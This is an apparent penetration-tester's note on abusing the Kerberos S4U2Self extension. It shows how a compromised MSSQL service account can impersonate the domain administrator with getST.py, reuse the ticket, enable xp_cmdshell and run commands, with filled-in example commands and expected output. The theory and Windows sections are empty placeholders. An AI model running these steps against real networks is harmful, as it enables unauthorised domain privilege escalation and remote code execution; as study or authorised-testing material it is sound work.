---
Primary_category: "[[KERBEROS EXTENSIONS]]"
title: "SERVICE FOR USER - S4U"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[KERBEROS EXTENSIONS]]

#### *Theory*

> 🛠️⌛

##### *Service for User to Self*

> ***S4U2Self***

##### *Service for User to Proxy*

> ***S4U2Proxy***

---

#### *Abuse - S4U2Self*

##### *Workflow*

Let's suppose that we compromise a domain service account called *svc_mssql* by performing a ***[[PASSWORD SPRAYING|Password Spraying]]***

Then, we gain remote access to the target and check that there is *MSSQL* instance running on *localhost* as the controlled service account

If would be really interesting to achieve *Code Execution* as the latter as it probably has several impersonation privileges - such as ***[[SEIMPERSONATEPRIVILEGE & SEASSIGNPRIMARYTOKENPRIVILEGE|SeImpersonate]]*** - that we could leverage to takeover the target

So, since we have control over the given service account, we could leverage the *Service for User to Self* extension to request a service ticket as any privileged domain account for the *SPN* related to *MSSQL*

Then, we could connect to the *MSSQL* instance, enable the *xp_cmdshell* procedure and gain *Code Execution* as the service account

##### *Requirements*

- ***A controlled service account***

##### *UNIX-like*

###### *Listing the Service Account's Service Principal Names*

```bash
kinit <ACCOUNT>@<DOMAIN>
```

```bash
ldapsearch -LLL -Q -N -Y GSSAPI -H 'ldap://<DC_FQDN>' -b 'DC=<DOMAIN>,DC=<TLD>' '(samAccountName=<SERVICE_ACCOUNT>)' samACcountName servicePrincipalName
```

> [!DANGER]- *e.g.*
>
> ```bash
> ldapsearch -LLL -Q -N -Y GSSAPI -H 'ldap://DC01.DOMAIN.INTERNAL' -b 'DC=DOMAIN,DC=INTERNAL' '(samAccountName=svc_mssql)' samACcountName servicePrincipalName
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> dn: CN=svc_mssql,CN=Users,DC=DOMAIN,DC=INTERNAL
> sAMAccountName: svc_mssql
> servicePrincipalName: MSSQL/DC01.DOMAIN.INTERNAL
> ```
>

###### *Performing S4U2Self*

```bash
getST.py -altservice '<SPN>' -impersonate '<IMPERSONATED_USER>' -self '<DOMAIN>/<SERVICE_ACCOUNT>:<PASSWD>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> getST.py -altservice 'MSSQL/DC01.DOMAIN.INTERNAL' -impersonate 'administrator' -self 'DOMAIN.INTERNAL/svc_mssql:password1234$!'
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> [-] CCache file is not found. Skipping...
> [*] Getting TGT for user
> [*] Impersonating administrator
> [*] Requesting S4U2self
> [*] Changing service from svc_mssql@DOMAIN.INTERNAL to MSSQL/DC01.DOMAIN.INTERNAL@DOMAIN.INTERNAL
> [*] Saving ticket in administrator@MSSQL_DC01.DOMAIN.INTERNAL@DOMAIN.INTERNAL.ccache
> ```
>

###### *Passing the ticket*

> ***Verifying authentication***

```bash
export KRB5CCNAME=$(realpath <SERVICE_TICKET>)
```

```bash
nxc mssql <DC_FQDN> --use-kcache
```

> [!DANGER]- *e.g.*
>
> ```bash
> export KRB5CCNAME=$(realpath administrator@MSSQL_DC01.DOMAIN.INTERNAL@DOMAIN.INTERNAL.ccache)
> ```
>
> ```bash
> nxc mssql DC01.DOMAIN.INTERNAL --use-kcache
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> MSSQL       DC01.DOMAIN.INTERNAL 1433   NAGOYA           [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:DOMAIN.INTERNAL) (EncryptionReq:False) 
> MSSQL       DC01.DOMAIN.INTERNAL 1433   NAGOYA           [+] DOMAIN.INTERNAL\administrator from ccache (Pwn3d!)
> ```
>

###### *Gaining RCE as Service Account via xp_cmdshell in a MSSQL Instance*

- ***Authentication***

> ***[[PASS THE TICKET|Pass the Ticket]]***

```bash
export KRB5CCNAME=$(realpath <SERVICE_TICKET>)
```

```bash
mssqlclient.py -k -no-pass '<DOMAIN>/<IMPERSONATED_USER>@<DC_FQDN>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> mssqlclient.py -k -no-pass 'DOMAIN.INTERNAL/administrator@DC01.DOMAIN.INTERNAL'
> ```
>

- ***Command Execution***

```bash
> enable_xp_cmdshell
> xp_cmdshell <COMMAND>
```

##### *Windows*

> 🛠️⌛